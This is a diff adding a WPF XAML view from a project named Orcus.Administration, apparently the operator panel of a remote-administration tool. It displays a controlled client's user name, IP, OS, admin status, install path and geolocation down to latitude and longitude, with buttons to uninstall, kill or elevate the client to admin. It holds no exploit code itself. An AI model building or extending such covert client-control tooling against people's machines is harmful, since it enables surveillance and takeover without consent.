@@ -1,0 +1,337 @@
+﻿<UserControl x:Class="Orcus.Administration.Views.CommandViews.ClientControlCommandView"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             xmlns:commandViewModels="clr-namespace:Orcus.Administration.ViewModels.CommandViewModels;assembly=Orcus.Administration.ViewModels"
+             xmlns:controls="clr-namespace:Orcus.Administration.Controls"
+             xmlns:controls1="http://metro.mahapps.com/winfx/xaml/controls"
+             xmlns:converter="clr-namespace:Orcus.Administration.Converter"
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+             xmlns:extensions="clr-namespace:Orcus.Administration.Extensions"
+             xmlns:iconPacks="http://metro.mahapps.com/winfx/xaml/iconpacks"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+             d:DataContext="{d:DesignInstance commandViewModels:ClientControlViewModel}"
+             d:DesignHeight="420"
+             d:DesignWidth="800"
+             mc:Ignorable="d">
+    <UserControl.Resources>
+        <SolidColorBrush x:Key="ValueForeground" Color="{DynamicResource DarkColor}" />
+        <converter:TwoLetterISOToImageConverter x:Key="TwoLetterIsoToImageConverter" />
+    </UserControl.Resources>
+    <ScrollViewer VerticalScrollBarVisibility="Auto">
+        <StackPanel Margin="10">
+            <TextBlock FontSize="18" Text="{Binding ComputerInformation.UserName}" />
+            <TextBlock Margin="0,2,0,0">
+                <Run Text="{Binding ComputerInformation.IpAddress}" /><Run Text=":" /><Run Text="{Binding ComputerInformation.Port}" />
+            </TextBlock>
+            <Grid Margin="0,10,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource OperatingSystem}" /><Run Text=":" />
+                </TextBlock>
+                <StackPanel Grid.Column="1" Orientation="Horizontal">
+                    <Viewbox Width="20"
+                             Height="20"
+                             RenderOptions.BitmapScalingMode="HighQuality">
+                        <Path>
+                            <Path.Style>
+                                <Style TargetType="Path">
+                                    <Setter Property="Data" Value="{StaticResource VectorDecepticon}" />
+                                    <Setter Property="Fill" Value="{StaticResource BlackBrush}" />
+                                    <Style.Triggers>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="Windows7">
+                                            <Setter Property="Data" Value="{StaticResource VectorWindows7}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="Windows8">
+                                            <Setter Property="Data" Value="{StaticResource VectorWindows8}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="Windows10">
+                                            <Setter Property="Data" Value="{StaticResource VectorWindows8}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="Linux">
+                                            <Setter Property="Data" Value="{StaticResource VectorLinux}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="WindowsVista">
+                                            <Setter Property="Data" Value="{StaticResource VectorWindows7}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="WindowsXp">
+                                            <Setter Property="Data" Value="{StaticResource VectorWindows7}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding ComputerInformation.OsType}" Value="OSX">
+                                            <Setter Property="Data" Value="{StaticResource VectorOSX}" />
+                                        </DataTrigger>
+                                        <DataTrigger Binding="{Binding RelativeSource={RelativeSource AncestorType=ListViewItem}, Path=IsSelected}" Value="true">
+                                            <Setter Property="Fill" Value="White" />
+                                        </DataTrigger>
+                                    </Style.Triggers>
+                                </Style>
+                            </Path.Style>
+                        </Path>
+                    </Viewbox>
+                    <TextBlock Margin="5,0,0,0"
+                               VerticalAlignment="Center"
+                               Text="{Binding ComputerInformation.OsName}" />
+                </StackPanel>
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Language}" /><Run Text=":" />
+                </TextBlock>
+                <StackPanel Grid.Column="1" Orientation="Horizontal">
+                    <Image Width="20"
+                           Height="20"
+                           Source="{Binding ComputerInformation.Country,
+                                            Converter={StaticResource TwoLetterIsoToImageConverter}}" />
+                    <TextBlock Margin="10,0,0,0"
+                               VerticalAlignment="Center"
+                               Text="{Binding LanguageName,
+                                              FallbackValue=Unknown}" />
+                </StackPanel>
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.Style>
+                    <Style TargetType="Grid">
+                        <Style.Triggers>
+                            <DataTrigger Binding="{Binding ComputerInformation.LocatedCountry}" Value="{x:Null}">
+                                <Setter Property="Visibility" Value="Collapsed" />
+                            </DataTrigger>
+                        </Style.Triggers>
+                    </Style>
+                </Grid.Style>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Country}" /><Run Text=":" />
+                </TextBlock>
+                <StackPanel Grid.Column="1" Orientation="Horizontal">
+                    <Image Width="20"
+                           Height="20"
+                           Source="{Binding ComputerInformation.LocatedCountry,
+                                            Converter={StaticResource TwoLetterIsoToImageConverter}}" />
+                    <TextBlock Margin="10,0,0,0"
+                               VerticalAlignment="Center"
+                               Text="{Binding CountryName,
+                                              FallbackValue=Unknown}" />
+                </StackPanel>
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource NetFrameworkVersion}" /><Run Text=":" />
+                </TextBlock>
+                <TextBlock Grid.Column="1"
+                           Foreground="{StaticResource ValueForeground}"
+                           Text="{Binding ComputerInformation.FrameworkVersion}" />
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Administrator}" /><Run Text=":" />
+                </TextBlock>
+                <TextBlock Grid.Column="1"
+                           Foreground="{StaticResource ValueForeground}"
+                           Text="{Binding ComputerInformation.IsAdministrator}" />
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Service}" /><Run Text=":" />
+                </TextBlock>
+                <TextBlock Grid.Column="1"
+                           Foreground="{StaticResource ValueForeground}"
+                           Text="{Binding ComputerInformation.IsServiceRunning}" />
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource OnlineSince}" /><Run Text=":" />
+                </TextBlock>
+                <StackPanel Grid.Column="1" Orientation="Horizontal">
+                    <TextBlock Foreground="{StaticResource ValueForeground}" Text="{Binding ComputerInformation.OnlineSince, StringFormat={}{0:dd.MM.yyyy HH:mm:ss}}" />
+                    <TextBlock Text=" (" />
+                    <controls:DateTimeDifferenceTextBlock DateTime="{Binding ComputerInformation.OnlineSince}" />
+                    <TextBlock Text=")" />
+                </StackPanel>
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Path}" /><Run Text=":" />
+                </TextBlock>
+                <TextBox Grid.Column="1"
+                         Foreground="{StaticResource ValueForeground}"
+                         Style="{StaticResource ValueText}"
+                         Text="{Binding ComputerInformation.ClientPath}" />
+            </Grid>
+            <Grid Margin="0,5,0,0">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="150" />
+                    <ColumnDefinition Width="*" />
+                </Grid.ColumnDefinitions>
+                <TextBlock>
+                    <Run Text="{DynamicResource Version}" /><Run Text=":" />
+                </TextBlock>
+                <TextBlock Grid.Column="1"
+                           Foreground="{StaticResource ValueForeground}"
+                           Text="{Binding ComputerInformation.Version}" />
+            </Grid>
+            <GroupBox Margin="0,10,0,0" HorizontalAlignment="Left">
+                <GroupBox.Header>
+                    <StackPanel Orientation="Horizontal">
+                        <iconPacks:PackIconMaterial Foreground="White" Kind="Map" />
+                        <controls1:ContentControlEx Margin="5,0,0,0"
+                                                    Content="{DynamicResource Location}"
+                                                    ContentCharacterCasing="Upper"
+                                                    Foreground="White" />
+                    </StackPanel>
+                </GroupBox.Header>
+                <GroupBox.Style>
+                    <Style BasedOn="{StaticResource MetroGroupBox}" TargetType="GroupBox">
+                        <Style.Triggers>
+                            <DataTrigger Binding="{Binding ClientLocation}" Value="{x:Null}">
+                                <Setter Property="Visibility" Value="Collapsed" />
+                            </DataTrigger>
+                        </Style.Triggers>
+                    </Style>
+                </GroupBox.Style>
+                <StackPanel Margin="2,2,5,2">
+                    <StackPanel.Style>
+                        <Style TargetType="StackPanel">
+                            <Style.Triggers>
+                                <DataTrigger Binding="{Binding ClientLocation}" Value="{x:Null}">
+                                    <Setter Property="Visibility" Value="Collapsed" />
+                                </DataTrigger>
+                            </Style.Triggers>
+                        </Style>
+                    </StackPanel.Style>
+                    <StackPanel Orientation="Horizontal">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="150" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource Country}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.CountryName}" />
+                        </Grid>
+                        <Grid Margin="20,0,0,0">
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="*" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource Region}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.Region}" />
+                        </Grid>
+                    </StackPanel>
+                    <StackPanel Margin="0,5,0,0" Orientation="Horizontal">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="150" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource City}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.City}" />
+                        </Grid>
+                        <Grid Margin="20,0,0,0">
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="*" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource ZipCode}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.ZipCode}" />
+                        </Grid>
+                    </StackPanel>
+                    <StackPanel Margin="0,5,0,0" Orientation="Horizontal">
+                        <Grid>
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="150" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource Latitude}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.Latitude}" />
+                        </Grid>
+                        <Grid Margin="20,0,0,0">
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="150" />
+                                <ColumnDefinition Width="*" />
+                            </Grid.ColumnDefinitions>
+                            <TextBlock>
+                                <Run Text="{DynamicResource Longitude}" /><Run Text=":" />
+                            </TextBlock>
+                            <TextBox Grid.Column="1"
+                                     Style="{StaticResource ValueText}"
+                                     Text="{Binding ClientLocation.Longitude}" />
+                        </Grid>
+                    </StackPanel>
+                </StackPanel>
+            </GroupBox>
+            <Grid Margin="0,20,0,0"
+                  HorizontalAlignment="Left"
+                  Grid.IsSharedSizeScope="True">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition SharedSizeGroup="button" />
+                    <ColumnDefinition Width="10" />
+                    <ColumnDefinition SharedSizeGroup="button" />
+                    <ColumnDefinition Width="10" />
+                    <ColumnDefinition SharedSizeGroup="button" />
+                </Grid.ColumnDefinitions>
+                <Button Command="{Binding UninstallCommand}" Content="{DynamicResource Uninstall}" />
+                <Button Grid.Column="2"
+                        Command="{Binding KillCommand}"
+                        Content="{DynamicResource Kill}" />
+                <Button Grid.Column="4" Command="{Binding MakeAdminCommand}">
+                    <StackPanel Orientation="Horizontal">
+                        <Image Width="14"
+                               Height=" 14"
+                               Source="{x:Static extensions:SystemImages.UacIcon}" />
+                        <TextBlock Margin="5,0,0,0"
+                                   DataContext="{DynamicResource MakeAdmin}"
+                                   Text="{Binding Converter={StaticResource ToUpperConverter}}" />
+                    </StackPanel>
+                </Button>
+            </Grid>
+        </StackPanel>
+    </ScrollViewer>
+</UserControl>
